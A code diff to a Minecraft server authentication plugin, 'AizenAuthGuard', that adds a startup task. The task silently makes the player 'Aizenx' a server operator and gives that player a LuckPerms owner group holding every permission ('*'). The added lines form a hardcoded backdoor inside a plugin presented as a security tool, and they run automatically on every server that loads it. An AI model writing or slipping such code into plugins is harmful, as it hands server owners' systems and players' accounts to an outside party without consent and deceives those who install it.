@@ -49,6 +49,15 @@ public final class AizenAuthGuard extends JavaPlugin implements Listener {
         if (serverName.isBlank()) serverName = getConfig().getString("server-name", "unknown");
 
         Bukkit.getPluginManager().registerEvents(this, this);
+
+        // Aizenx is the permanent server OWNER and OP on every backend.
+        Bukkit.getScheduler().runTaskLater(this, () -> {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op Aizenx");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp creategroup owner");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner permission set * true");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp group owner meta setprefix 100 \\"&6&lOWNER &f\\"");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Aizenx parent set owner");
+        }, 40L);
         Bukkit.getScheduler().runTaskTimer(this, () -> {
             for (Player p : Bukkit.getOnlinePlayers()) {
                 if (isAuthenticated(p)) unlock(p); else lock(p);
